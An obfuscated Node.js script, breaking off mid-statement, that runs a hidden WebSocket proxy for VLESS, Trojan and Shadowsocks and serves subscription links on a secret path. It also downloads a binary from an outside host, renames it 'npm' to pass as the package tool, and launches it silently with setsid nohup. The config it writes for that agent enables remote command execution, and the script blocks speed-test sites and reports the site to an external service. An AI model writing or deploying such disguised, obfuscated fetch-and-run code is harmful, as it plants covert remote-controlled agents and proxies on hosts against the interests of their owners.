#!/usr/bin/env node

const _0x57ab16=_0x34be;(function(_0x45e3a1,_0x3f369a){const _0x1c26a6={_0x3fa38f:0x235,_0x1f9ceb:0x1cf,_0x266b44:0x213,_0x2a69c4:0x1d1,_0x4e2003:0x20e,_0x115c55:0x246,_0x5dac50:0x23c},_0x48e869=_0x34be,_0x38f6da=_0x45e3a1();while(!![]){try{const _0xc0f7db=-parseInt(_0x48e869(_0x1c26a6._0x3fa38f))/0x1*(parseInt(_0x48e869(0x1fd))/0x2)+parseInt(_0x48e869(0x204))/0x3+-parseInt(_0x48e869(0x1e1))/0x4*(parseInt(_0x48e869(_0x1c26a6._0x1f9ceb))/0x5)+-parseInt(_0x48e869(0x1d6))/0x6*(-parseInt(_0x48e869(_0x1c26a6._0x266b44))/0x7)+-parseInt(_0x48e869(_0x1c26a6._0x2a69c4))/0x8*(-parseInt(_0x48e869(_0x1c26a6._0x4e2003))/0x9)+-parseInt(_0x48e869(0x211))/0xa+-parseInt(_0x48e869(_0x1c26a6._0x115c55))/0xb*(-parseInt(_0x48e869(_0x1c26a6._0x5dac50))/0xc);if(_0xc0f7db===_0x3f369a)break;else _0x38f6da['push'](_0x38f6da['shift']());}catch(_0x5163d3){_0x38f6da['push'](_0x38f6da['shift']());}}}(_0x3a4d,0x46c6e));const os=require('os'),http=require(_0x57ab16(0x1d8)),fs=require('fs'),axios=require(_0x57ab16(0x1f3)),net=require(_0x57ab16(0x22a)),path=require(_0x57ab16(0x1e5)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x57ab16(0x228)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x57ab16(0x1d7)]['UUID']||_0x57ab16(0x21d),NEZHA_SERVER=process[_0x57ab16(0x1d7)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x57ab16(0x1d7)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x57ab16(0x1d7)][_0x57ab16(0x1f2)]||'',DOMAIN=process[_0x57ab16(0x1d7)][_0x57ab16(0x1ea)]||'your-domain.com',AUTO_ACCESS=process[_0x57ab16(0x1d7)][_0x57ab16(0x241)]||![],WSPATH=process[_0x57ab16(0x1d7)]['WSPATH']||UUID[_0x57ab16(0x23d)](0x0,0x8),SUB_PATH=process[_0x57ab16(0x1d7)]['SUB_PATH']||_0x57ab16(0x1d5),NAME=process[_0x57ab16(0x1d7)][_0x57ab16(0x221)]||'',PORT=process[_0x57ab16(0x1d7)][_0x57ab16(0x1db)]||0xbb8;let uuid=UUID[_0x57ab16(0x239)](/-/g,''),CurrentDomain=DOMAIN,Tls='tls',CurrentPort=0x1bb,ISP='';const DNS_SERVERS=[_0x57ab16(0x22d),_0x57ab16(0x1f6)],BLOCKED_DOMAINS=[_0x57ab16(0x1ff),'fast.com','speedtest.cn',_0x57ab16(0x205),'speedof.me',_0x57ab16(0x245),'bandwidth.place',_0x57ab16(0x20b),_0x57ab16(0x1e7),_0x57ab16(0x20c)];function isBlockedDomain(_0x5ae7df){const _0x59eed8=_0x57ab16;if(!_0x5ae7df)return![];const _0x5cef1a=_0x5ae7df['toLowerCase']();return BLOCKED_DOMAINS[_0x59eed8(0x22b)](_0x3be25e=>{return _0x5cef1a===_0x3be25e||_0x5cef1a['endsWith']('.'+_0x3be25e);});}async function getisp(){const _0x428318={_0x5d9b42:0x1e0,_0x20c742:0x239},_0x50247e=_0x57ab16;try{const _0x15db30=await axios[_0x50247e(0x1cd)](_0x50247e(0x1d3),{'headers':{'User-Agent':_0x50247e(0x214),'timeout':0xbb8}}),_0x58e52c=_0x15db30[_0x50247e(_0x428318._0x5d9b42)];ISP=(_0x58e52c['country_code']+'-'+_0x58e52c[_0x50247e(0x208)])[_0x50247e(_0x428318._0x20c742)](/ /g,'_');}catch(_0x1a42b0){try{const _0x35e95a=await axios[_0x50247e(0x1cd)](_0x50247e(0x1d0),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}}),_0x11099e=_0x35e95a['data'];ISP=(_0x11099e['countryCode']+'-'+_0x11099e[_0x50247e(0x226)])[_0x50247e(0x239)](/ /g,'_');}catch(_0x1370fd){ISP='Unknown';}}}function _0x3a4d(){const _0x3fc874=['aarch64','createServer','log','data','995164IPIRBO','https://dns.google/resolve?name=','&sni=','stream','path','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','librespeed.org','find','Failed\x20to\x20get\x20IP','DOMAIN','arm64','close','2096','base64','connect','message','catch','NEZHA_KEY','axios','tls','true','1.1.1.1','Not\x20Found\x0a','error:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','utf-8',';skip-cert-verify%3Dtrue;mux%3D0#','npm','708FBMddS','https://oooo.serv00.net/add-url','speedtest.net','\x20-p\x20','length','writeHead','end','1415505ciiXNe','speed.cloudflare.com','error','&path=%2F','isp','toString','createWriteStream','speed.io','speedcheck.org','none:','27zHnKSL','from','ss://','2720270CnbpPs','/bin/bash','2237452PXiCYl','Mozilla/5.0','443','your-domain.com','--tls','false','text/plain','application/dns-json','text/html','includes','dcb7dbff-d1fa-47b2-a3d6-f990e3c06a49','https://','setsid\x20nohup\x20./npm\x20-s\x20','Hello\x20world!','NAME','concat','chmod\x20+x\x20npm','arm','Status','org','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','child_process','join','net','some','every','8.8.4.4','readUInt8','https://amd64.ssss.nyc.mn/agent',';path%3D%2F','Automatic\x20Access\x20Task\x20added\x20successfully','connection','Failed\x20to\x20resolve\x20','npm\x20is\x20already\x20running,\x20skip\x20running...','1482xNJZho','2087','forEach','application/json','replace','map','sni%3D','12SIISin','slice','https://amd64.ssss.nyc.mn/v1','Server','createHash','AUTO_ACCESS','config.yaml','&type=A','none','testmy.net','610346xlqaiZ','2053','once','tls;','type','reduce','Server\x20is\x20running\x20on\x20port\x20','readUInt16BE','url','pipe','split','write','post','trim','&fp=chrome&type=ws&host=','npm\x20download\x20successfully','then','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','get','https://arm64.ssss.nyc.mn/agent','5WSWQPA','http://ip-api.com/json','1302376FHNxow','npm\x20is\x20running','https://api.ip.sb/geoip','digest','abs','6IbAoCb','env','http','?security=','listen','PORT','https://api-ipv4.ip.sb/ip'];_0x3a4d=function(){return _0x3fc874;};return _0x3a4d();}async function getip(){const _0x35ae76={_0x279818:0x216,_0x1cc147:0x1dc,_0x291166:0x244,_0x1b0616:0x1e9,_0x58f37b:0x1f0,_0x109672:0x1f4},_0x1c9615=_0x57ab16;if(!DOMAIN||DOMAIN===_0x1c9615(_0x35ae76._0x279818))try{const _0x2f73a2=await axios[_0x1c9615(0x1cd)](_0x1c9615(_0x35ae76._0x1cc147),{'timeout':0x1388}),_0x3db737=_0x2f73a2[_0x1c9615(0x1e0)][_0x1c9615(0x1c8)]();CurrentDomain=_0x3db737,Tls=_0x1c9615(_0x35ae76._0x291166),CurrentPort=PORT;}catch(_0x26a34c){console[_0x1c9615(0x206)](_0x1c9615(_0x35ae76._0x1b0616),_0x26a34c[_0x1c9615(_0x35ae76._0x58f37b)]),(CurrentDomain='cahnge-your-domain.com',Tls=_0x1c9615(0x1f4),CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls=_0x1c9615(_0x35ae76._0x109672),CurrentPort=0x1bb;}const httpServer=http[_0x57ab16(0x1de)](async(_0x3a10c2,_0x454892)=>{const _0xc6959f={_0x4cbedf:0x1f4,_0x55e96e:0x244,_0x4c45dd:0x1d9,_0x44acfd:0x1e3,_0x385482:0x1c9,_0x158ace:0x207,_0x3f7621:0x20d,_0x3264ae:0x209,_0x20cc82:0x230,_0x1c351c:0x20f,_0x5d6e22:0x209,_0x3349b6:0x202,_0x16b755:0x219,_0x14b597:0x203,_0x217f30:0x1f7},_0x302665={_0x218dc6:0x202,_0x175a14:0x203,_0x272584:0x220},_0x17fd92=_0x57ab16;if(_0x3a10c2['url']==='/'){const _0x272fbc=path[_0x17fd92(0x229)](__dirname,'index.html');fs['readFile'](_0x272fbc,'utf8',(_0x1b9a22,_0x4f1701)=>{const _0x3dff83=_0x17fd92;if(_0x1b9a22){_0x454892[_0x3dff83(_0x302665._0x218dc6)](0xc8,{'Content-Type':_0x3dff83(0x21b)}),_0x454892[_0x3dff83(_0x302665._0x175a14)](_0x3dff83(_0x302665._0x272584));return;}_0x454892['writeHead'](0xc8,{'Content-Type':_0x3dff83(0x21b)}),_0x454892['end'](_0x4f1701);});return;}else{if(_0x3a10c2['url']==='/'+SUB_PATH){await getisp(),await getip();const _0x36dd6a=NAME?NAME+'-'+ISP:ISP,_0x3066fa=Tls===_0x17fd92(_0xc6959f._0x4cbedf)?_0x17fd92(_0xc6959f._0x4cbedf):_0x17fd92(_0xc6959f._0x55e96e),_0x2fef66=Tls==='tls'?_0x17fd92(0x249):'',_0x8aa07b='vless://'+UUID+'@'+CurrentDomain+':'+CurrentPort+'?encryption=none&security='+_0x3066fa+'&sni='+CurrentDomain+'&fp=chrome&type=ws&host='+CurrentDomain+'&path=%2F'+WSPATH+'#'+_0x36dd6a,_0x1f53d7='trojan://'+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x17fd92(_0xc6959f._0x4c45dd)+_0x3066fa+_0x17fd92(_0xc6959f._0x44acfd)+CurrentDomain+_0x17fd92(_0xc6959f._0x385482)+CurrentDomain+_0x17fd92(_0xc6959f._0x158ace)+WSPATH+'#'+_0x36dd6a,_0x3984ad=Buffer[_0x17fd92(0x20f)](_0x17fd92(_0xc6959f._0x3f7621)+UUID)[_0x17fd92(_0xc6959f._0x3264ae)](_0x17fd92(0x1ee)),_0x5a5a57=_0x17fd92(0x210)+_0x3984ad+'@'+CurrentDomain+':'+CurrentPort+'?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D'+CurrentDomain+_0x17fd92(_0xc6959f._0x20cc82)+WSPATH+';'+_0x2fef66+_0x17fd92(0x23b)+CurrentDomain+_0x17fd92(0x1fb)+_0x36dd6a,_0x1d8135=_0x8aa07b+'\x0a'+_0x1f53d7+'\x0a'+_0x5a5a57,_0x452e18=Buffer[_0x17fd92(_0xc6959f._0x1c351c)](_0x1d8135)[_0x17fd92(_0xc6959f._0x5d6e22)](_0x17fd92(0x1ee));_0x454892['writeHead'](0xc8,{'Content-Type':_0x17fd92(0x219)}),_0x454892['end'](_0x452e18+'\x0a');}else _0x454892[_0x17fd92(_0xc6959f._0x3349b6)](0x194,{'Content-Type':_0x17fd92(_0xc6959f._0x16b755)}),_0x454892[_0x17fd92(_0xc6959f._0x14b597)](_0x17fd92(_0xc6959f._0x217f30));}});function resolveHost(_0x1ed904){const _0xf8779e={_0x3bc2c2:0x233,_0x4554d4:0x1e2,_0x41ac5a:0x243,_0x25ca11:0x1cd,_0x4bc6b6:0x1f1};return new Promise((_0x234c24,_0xa54892)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x1ed904)){_0x234c24(_0x1ed904);return;}let _0x3a9ef5=0x0;function _0x335502(){const _0x33dfb5={_0x2844f2:0x1e0},_0x2ce929=_0x34be;if(_0x3a9ef5>=DNS_SERVERS[_0x2ce929(0x201)]){_0xa54892(new Error(_0x2ce929(_0xf8779e._0x3bc2c2)+_0x1ed904+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x3549c5=DNS_SERVERS[_0x3a9ef5];_0x3a9ef5++;const _0x4bbe21=_0x2ce929(_0xf8779e._0x4554d4)+encodeURIComponent(_0x1ed904)+_0x2ce929(_0xf8779e._0x41ac5a);axios[_0x2ce929(_0xf8779e._0x25ca11)](_0x4bbe21,{'timeout':0x1388,'headers':{'Accept':_0x2ce929(0x21a)}})['then'](_0x441884=>{const _0x9bac6=_0x2ce929,_0x5cde06=_0x441884[_0x9bac6(_0x33dfb5._0x2844f2)];if(_0x5cde06[_0x9bac6(0x225)]===0x0&&_0x5cde06['Answer']&&_0x5cde06['Answer']['length']>0x0){const _0x491444=_0x5cde06['Answer'][_0x9bac6(0x1e8)](_0x3bf888=>_0x3bf888[_0x9bac6(0x24a)]===0x1);if(_0x491444){_0x234c24(_0x491444['data']);return;}}_0x335502();})[_0x2ce929(_0xf8779e._0x4bc6b6)](_0x1bfcd0=>{_0x335502();});}_0x335502();});}function handleVlsConnection(_0x2fb94f,_0x4c20eb){const _0x4365fd={_0x18ed77:0x22c,_0x493f03:0x23d,_0x26536c:0x23d,_0x407ecc:0x24b,_0x24010f:0x23a,_0x5c6245:0x1f1},_0x305df2={_0x3ad9f2:0x1c6,_0x338837:0x24f},_0x25ac9d={_0x4e0a90:0x1c6,_0x4b4c0e:0x23d},_0x3df9ef=_0x57ab16,[_0x4a4108]=_0x4c20eb,_0xa0fc1e=_0x4c20eb[_0x3df9ef(0x23d)](0x1,0x11);if(!_0xa0fc1e[_0x3df9ef(_0x4365fd._0x18ed77)]((_0x418e7c,_0x1b629b)=>_0x418e7c==parseInt(uuid['substr'](_0x1b629b*0x2,0x2),0x10)))return![];let _0xd035d3=_0x4c20eb[_0x3df9ef(_0x4365fd._0x493f03)](0x11,0x12)[_0x3df9ef(0x22e)]()+0x13;const _0x1e883f=_0x4c20eb[_0x3df9ef(0x23d)](_0xd035d3,_0xd035d3+=0x2)[_0x3df9ef(0x24d)](0x0),_0x36def9=_0x4c20eb[_0x3df9ef(0x23d)](_0xd035d3,_0xd035d3+=0x1)['readUInt8'](),_0xcda8cb=_0x36def9==0x1?_0x4c20eb['slice'](_0xd035d3,_0xd035d3+=0x4)['join']('.'):_0x36def9==0x2?new TextDecoder()['decode'](_0x4c20eb[_0x3df9ef(_0x4365fd._0x26536c)](_0xd035d3+0x1,_0xd035d3+=0x1+_0x4c20eb[_0x3df9ef(0x23d)](_0xd035d3,_0xd035d3+0x1)[_0x3df9ef(0x22e)]())):_0x36def9==0x3?_0x4c20eb['slice'](_0xd035d3,_0xd035d3+=0x10)[_0x3df9ef(_0x4365fd._0x407ecc)]((_0x1699ef,_0x4c2a20,_0x496921,_0x28d527)=>_0x496921%0x2?_0x1699ef[_0x3df9ef(0x222)](_0x28d527[_0x3df9ef(0x23d)](_0x496921-0x1,_0x496921+0x1)):_0x1699ef,[])[_0x3df9ef(_0x4365fd._0x24010f)](_0x2db19b=>_0x2db19b[_0x3df9ef(0x24d)](0x0)['toString'](0x10))[_0x3df9ef(0x229)](':'):'';if(isBlockedDomain(_0xcda8cb))return _0x2fb94f['close'](),![];_0x2fb94f['send'](new Uint8Array([_0x4a4108,0x0]));const _0x55e571=createWebSocketStream(_0x2fb94f);return resolveHost(_0xcda8cb)['then'](_0x1deb9a=>{const _0x26131f=_0x3df9ef;net[_0x26131f(0x1ef)]({'host':_0x1deb9a,'port':_0x1e883f},function(){const _0xa5258a=_0x26131f;this[_0xa5258a(_0x25ac9d._0x4e0a90)](_0x4c20eb[_0xa5258a(_0x25ac9d._0x4b4c0e)](_0xd035d3)),_0x55e571['on'](_0xa5258a(0x206),()=>{})[_0xa5258a(0x24f)](this)['on'](_0xa5258a(0x206),()=>{})[_0xa5258a(0x24f)](_0x55e571);})['on']('error',()=>{});})[_0x3df9ef(_0x4365fd._0x5c6245)](_0x1b089c=>{const _0x246e2f=_0x3df9ef;net[_0x246e2f(0x1ef)]({'host':_0xcda8cb,'port':_0x1e883f},function(){const _0x2f2aa6=_0x246e2f;this[_0x2f2aa6(_0x305df2._0x3ad9f2)](_0x4c20eb[_0x2f2aa6(0x23d)](_0xd035d3)),_0x55e571['on']('error',()=>{})[_0x2f2aa6(0x24f)](this)['on'](_0x2f2aa6(0x206),()=>{})[_0x2f2aa6(_0x305df2._0x338837)](_0x55e571);})['on']('error',()=>{});}),!![];}function handleTrojConnection(_0x55aa94,_0xe85274){const _0x459c0d={_0x211e60:0x240,_0x446f08:0x1d4,_0x59996e:0x23d,_0x20d76e:0x209,_0x4fd304:0x24b,_0x5433be:0x23a,_0x2de0a7:0x229},_0x38f3a1={_0x5948b6:0x201,_0x920b9c:0x24f},_0x575229={_0x408248:0x201,_0x3dd82b:0x206},_0x21e538=_0x57ab16;try{if(_0xe85274['length']<0x3a)return![];const _0x548fd7=_0xe85274['slice'](0x0,0x38)['toString'](),_0x51d180=[UUID];let _0x30ddde=null;for(const _0xda5d5a of _0x51d180){const _0x157514=crypto[_0x21e538(_0x459c0d._0x211e60)]('sha224')['update'](_0xda5d5a)[_0x21e538(_0x459c0d._0x446f08)]('hex');if(_0x157514===_0x548fd7){_0x30ddde=_0xda5d5a;break;}}if(!_0x30ddde)return![];let _0x491bb6=0x38;_0xe85274[_0x491bb6]===0xd&&_0xe85274[_0x491bb6+0x1]===0xa&&(_0x491bb6+=0x2);const _0x20031c=_0xe85274[_0x491bb6];if(_0x20031c!==0x1)return![];_0x491bb6+=0x1;const _0x2cb18c=_0xe85274[_0x491bb6];_0x491bb6+=0x1;let _0x16af43,_0x3cea04;if(_0x2cb18c===0x1)_0x16af43=_0xe85274[_0x21e538(0x23d)](_0x491bb6,_0x491bb6+0x4)[_0x21e538(0x229)]('.'),_0x491bb6+=0x4;else{if(_0x2cb18c===0x3){const _0x68dc15=_0xe85274[_0x491bb6];_0x491bb6+=0x1,_0x16af43=_0xe85274[_0x21e538(_0x459c0d._0x59996e)](_0x491bb6,_0x491bb6+_0x68dc15)[_0x21e538(_0x459c0d._0x20d76e)](),_0x491bb6+=_0x68dc15;}else{if(_0x2cb18c===0x4)_0x16af43=_0xe85274[_0x21e538(_0x459c0d._0x59996e)](_0x491bb6,_0x491bb6+0x10)[_0x21e538(_0x459c0d._0x4fd304)]((_0x50889d,_0x5b4ffc,_0x3b8981,_0x2aa429)=>_0x3b8981%0x2?_0x50889d[_0x21e538(0x222)](_0x2aa429[_0x21e538(0x23d)](_0x3b8981-0x1,_0x3b8981+0x1)):_0x50889d,[])[_0x21e538(_0x459c0d._0x5433be)](_0x26d0b5=>_0x26d0b5[_0x21e538(0x24d)](0x0)['toString'](0x10))[_0x21e538(_0x459c0d._0x2de0a7)](':'),_0x491bb6+=0x10;else return![];}}_0x3cea04=_0xe85274[_0x21e538(0x24d)](_0x491bb6),_0x491bb6+=0x2;_0x491bb6<_0xe85274[_0x21e538(0x201)]&&_0xe85274[_0x491bb6]===0xd&&_0xe85274[_0x491bb6+0x1]===0xa&&(_0x491bb6+=0x2);if(isBlockedDomain(_0x16af43))return _0x55aa94[_0x21e538(0x1ec)](),![];const _0x23ee63=createWebSocketStream(_0x55aa94);return resolveHost(_0x16af43)[_0x21e538(0x1cb)](_0x5cbee4=>{const _0x5192c9=_0x21e538;net[_0x5192c9(0x1ef)]({'host':_0x5cbee4,'port':_0x3cea04},function(){const _0x262ceb=_0x5192c9;_0x491bb6<_0xe85274[_0x262ceb(_0x575229._0x408248)]&&this['write'](_0xe85274[_0x262ceb(0x23d)](_0x491bb6)),_0x23ee63['on'](_0x262ceb(_0x575229._0x3dd82b),()=>{})[_0x262ceb(0x24f)](this)['on'](_0x262ceb(0x206),()=>{})[_0x262ceb(0x24f)](_0x23ee63);})['on']('error',()=>{});})['catch'](_0x31b118=>{const _0x31d91a=_0x21e538;net['connect']({'host':_0x16af43,'port':_0x3cea04},function(){const _0x274fed=_0x34be;_0x491bb6<_0xe85274[_0x274fed(_0x38f3a1._0x5948b6)]&&this['write'](_0xe85274[_0x274fed(0x23d)](_0x491bb6)),_0x23ee63['on'](_0x274fed(0x206),()=>{})[_0x274fed(_0x38f3a1._0x920b9c)](this)['on'](_0x274fed(0x206),()=>{})[_0x274fed(0x24f)](_0x23ee63);})['on'](_0x31d91a(0x206),()=>{});}),!![];}catch(_0x1768b4){return![];}}function handleSsConnection(_0x517f17,_0x343ae4){const _0x5017e7={_0x3710f2:0x229,_0x272ab7:0x23d,_0x164624:0x23a,_0x1a063a:0x24d,_0x4f1648:0x1ec},_0x1ba615={_0x2dc1b5:0x201,_0x33e9b1:0x24f,_0x1f9d69:0x24f},_0x231717=_0x57ab16;try{let _0x4c3e80=0x0;const _0x383815=_0x343ae4[_0x4c3e80];_0x4c3e80+=0x1;let _0x3ca44a,_0x4bb7c3;if(_0x383815===0x1)_0x3ca44a=_0x343ae4[_0x231717(0x23d)](_0x4c3e80,_0x4c3e80+0x4)[_0x231717(_0x5017e7._0x3710f2)]('.'),_0x4c3e80+=0x4;else{if(_0x383815===0x3){const _0xd66ff4=_0x343ae4[_0x4c3e80];_0x4c3e80+=0x1,_0x3ca44a=_0x343ae4['slice'](_0x4c3e80,_0x4c3e80+_0xd66ff4)[_0x231717(0x209)](),_0x4c3e80+=_0xd66ff4;}else{if(_0x383815===0x4)_0x3ca44a=_0x343ae4[_0x231717(_0x5017e7._0x272ab7)](_0x4c3e80,_0x4c3e80+0x10)['reduce']((_0x2f63d5,_0xdba44f,_0x451d61,_0x5ed09f)=>_0x451d61%0x2?_0x2f63d5[_0x231717(0x222)](_0x5ed09f[_0x231717(0x23d)](_0x451d61-0x1,_0x451d61+0x1)):_0x2f63d5,[])[_0x231717(_0x5017e7._0x164624)](_0x55fc3d=>_0x55fc3d[_0x231717(0x24d)](0x0)[_0x231717(0x209)](0x10))[_0x231717(0x229)](':'),_0x4c3e80+=0x10;else return![];}}_0x4bb7c3=_0x343ae4[_0x231717(_0x5017e7._0x1a063a)](_0x4c3e80),_0x4c3e80+=0x2;if(isBlockedDomain(_0x3ca44a))return _0x517f17[_0x231717(_0x5017e7._0x4f1648)](),![];const _0x238fe1=createWebSocketStream(_0x517f17);return resolveHost(_0x3ca44a)[_0x231717(0x1cb)](_0x2efd64=>{net['connect']({'host':_0x2efd64,'port':_0x4bb7c3},function(){const _0x2d6161=_0x34be;_0x4c3e80<_0x343ae4[_0x2d6161(_0x1ba615._0x2dc1b5)]&&this[_0x2d6161(0x1c6)](_0x343ae4[_0x2d6161(0x23d)](_0x4c3e80)),_0x238fe1['on'](_0x2d6161(0x206),()=>{})[_0x2d6161(_0x1ba615._0x33e9b1)](this)['on'](_0x2d6161(0x206),()=>{})[_0x2d6161(_0x1ba615._0x1f9d69)](_0x238fe1);})['on']('error',()=>{});})['catch'](_0x5518b0=>{const _0x2b7772={_0x383178:0x201},_0x4e8b12=_0x231717;net[_0x4e8b12(0x1ef)]({'host':_0x3ca44a,'port':_0x4bb7c3},function(){const _0x1a9766=_0x4e8b12;_0x4c3e80<_0x343ae4[_0x1a9766(_0x2b7772._0x383178)]&&this['write'](_0x343ae4[_0x1a9766(0x23d)](_0x4c3e80)),_0x238fe1['on']('error',()=>{})[_0x1a9766(0x24f)](this)['on'](_0x1a9766(0x206),()=>{})['pipe'](_0x238fe1);})['on']('error',()=>{});}),!![];}catch(_0x28c593){return![];}}const wss=new WebSocket[(_0x57ab16(0x23f))]({'server':httpServer});wss['on'](_0x57ab16(0x232),(_0x1e7b85,_0x586487)=>{const _0x56ee9d={_0x427e83:0x24e,_0x2fe57c:0x248,_0x4f9314:0x1f0},_0x41e3c3={_0x151c27:0x201,_0x49c8f6:0x23d,_0x7b9bf5:0x22c,_0x4d6921:0x1ec,_0xd60e20:0x201},_0x1fcd05=_0x57ab16,_0x55b22c=_0x586487[_0x1fcd05(_0x56ee9d._0x427e83)]||'',_0xa5948f='/'+WSPATH;if(!_0x55b22c['startsWith'](_0xa5948f)){_0x1e7b85['close']();return;}_0x1e7b85[_0x1fcd05(_0x56ee9d._0x2fe57c)](_0x1fcd05(_0x56ee9d._0x4f9314),_0x50815e=>{const _0x16c572=_0x1fcd05;if(_0x50815e[_0x16c572(_0x41e3c3._0x151c27)]>0x11&&_0x50815e[0x0]===0x0){const _0x41c44c=_0x50815e[_0x16c572(_0x41e3c3._0x49c8f6)](0x1,0x11),_0x55415f=_0x41c44c[_0x16c572(_0x41e3c3._0x7b9bf5)]((_0x3358b2,_0x6fc9b2)=>_0x3358b2==parseInt(uuid['substr'](_0x6fc9b2*0x2,0x2),0x10));if(_0x55415f){!handleVlsConnection(_0x1e7b85,_0x50815e)&&_0x1e7b85[_0x16c572(_0x41e3c3._0x4d6921)]();return;}}if(_0x50815e[_0x16c572(_0x41e3c3._0xd60e20)]>=0x3a){if(handleTrojConnection(_0x1e7b85,_0x50815e))return;}if(_0x50815e[_0x16c572(0x201)]>0x0&&(_0x50815e[0x0]===0x1||_0x50815e[0x0]===0x3||_0x50815e[0x0]===0x4)){if(handleSsConnection(_0x1e7b85,_0x50815e))return;}_0x1e7b85[_0x16c572(0x1ec)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x3d08c2={_0x12c6e2:0x1ce},_0x4504b6=_0x57ab16,_0x416c00=os['arch']();return _0x416c00===_0x4504b6(0x224)||_0x416c00===_0x4504b6(0x1eb)||_0x416c00===_0x4504b6(0x1dd)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x4504b6(_0x3d08c2._0x12c6e2):!NEZHA_PORT?_0x4504b6(0x23e):_0x4504b6(0x22f);},downloadFile=async()=>{const _0x4ef52f={_0x3abc90:0x1cd,_0x401a77:0x1e4,_0x187239:0x20a,_0x31244e:0x1fc,_0x1ce57a:0x1e0,_0x44dc9a:0x24f},_0x4b2a44=_0x57ab16;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2498c8=getDownloadUrl(),_0x19741b=await axios({'method':_0x4b2a44(_0x4ef52f._0x3abc90),'url':_0x2498c8,'responseType':_0x4b2a44(_0x4ef52f._0x401a77)}),_0x500973=fs[_0x4b2a44(_0x4ef52f._0x187239)](_0x4b2a44(_0x4ef52f._0x31244e));return _0x19741b[_0x4b2a44(_0x4ef52f._0x1ce57a)][_0x4b2a44(_0x4ef52f._0x44dc9a)](_0x500973),new Promise((_0x266e25,_0x2ba0c3)=>{const _0x5a2d4b={_0xb3970d:0x1ca},_0xbe99ed=_0x4b2a44;_0x500973['on']('finish',()=>{const _0x2dfb4b=_0x34be;console[_0x2dfb4b(0x1df)](_0x2dfb4b(_0x5a2d4b._0xb3970d)),exec(_0x2dfb4b(0x223),_0x5a60e1=>{if(_0x5a60e1)_0x2ba0c3(_0x5a60e1);_0x266e25();});}),_0x500973['on'](_0xbe99ed(0x206),_0x2ba0c3);});}catch(_0x536428){throw _0x536428;}},runnz=async()=>{const _0x23f069={_0xf4b67a:0x1fa,_0xe00227:0x234,_0x2c22bd:0x215,_0x59cfe7:0x247,_0x3ce8b0:0x1f5,_0x9de164:0x1e6,_0x2891de:0x212},_0x3a52f5={_0x19abc6:0x206},_0x358d0c=_0x57ab16;try{const _0x4b52d6=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x358d0c(_0x23f069._0xf4b67a)});if(_0x4b52d6[_0x358d0c(0x1c8)]()!==''){console[_0x358d0c(0x1df)](_0x358d0c(_0x23f069._0xe00227));return;}}catch(_0x102a9f){}await downloadFile();let _0x197d0e='',_0x4eeb09=[_0x358d0c(_0x23f069._0x2c22bd),'8443',_0x358d0c(0x1ed),_0x358d0c(0x236),'2083',_0x358d0c(_0x23f069._0x59cfe7)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4dc7f3=_0x4eeb09[_0x358d0c(0x21c)](NEZHA_PORT)?_0x358d0c(0x217):'';_0x197d0e=_0x358d0c(0x21f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x358d0c(0x200)+NEZHA_KEY+'\x20'+_0x4dc7f3+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2e79ad=NEZHA_SERVER[_0x358d0c(0x21c)](':')?NEZHA_SERVER[_0x358d0c(0x250)](':')['pop']():'',_0x1a3094=_0x4eeb09['includes'](_0x2e79ad)?_0x358d0c(_0x23f069._0x3ce8b0):_0x358d0c(0x218),_0x4311ac='client_secret:\x20'+NEZHA_KEY+_0x358d0c(0x227)+NEZHA_SERVER+_0x358d0c(_0x23f069._0x9de164)+_0x1a3094+_0x358d0c(0x1f9)+UUID;fs['writeFileSync']('config.yaml',_0x4311ac);}_0x197d0e=_0x358d0c(0x1cc);}else return;}try{exec(_0x197d0e,{'shell':_0x358d0c(_0x23f069._0x2891de)},_0x1a45a8=>{const _0x2f07bc=_0x358d0c;if(_0x1a45a8)console[_0x2f07bc(_0x3a52f5._0x19abc6)]('npm\x20running\x20error:',_0x1a45a8);else console[_0x2f07bc(0x1df)](_0x2f07bc(0x1d2));});}catch(_0x34301f){console[_0x358d0c(0x206)](_0x358d0c(0x1f8)+_0x34301f);}};function _0x34be(_0x1cbc1a,_0x56a8cb){const _0x3a4df0=_0x3a4d();return _0x34be=function(_0x34be56,_0x224429){_0x34be56=_0x34be56-0x1c6;let _0x8b2cfd=_0x3a4df0[_0x34be56];return _0x8b2cfd;},_0x34be(_0x1cbc1a,_0x56a8cb);}async function addAccessTask(){const _0x48f926=_0x57ab16;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x450539=_0x48f926(0x21e)+DOMAIN+'/'+SUB_PATH;try{const _0x555743=await axios[_0x48f926(0x1c7)](_0x48f926(0x1fe),{'url':_0x450539},{'headers':{'Content-Type':_0x48f926(0x238)}});console[_0x48f926(0x1df)](_0x48f926(0x231));}catch(_0x32666a){}}const delFiles=()=>{const 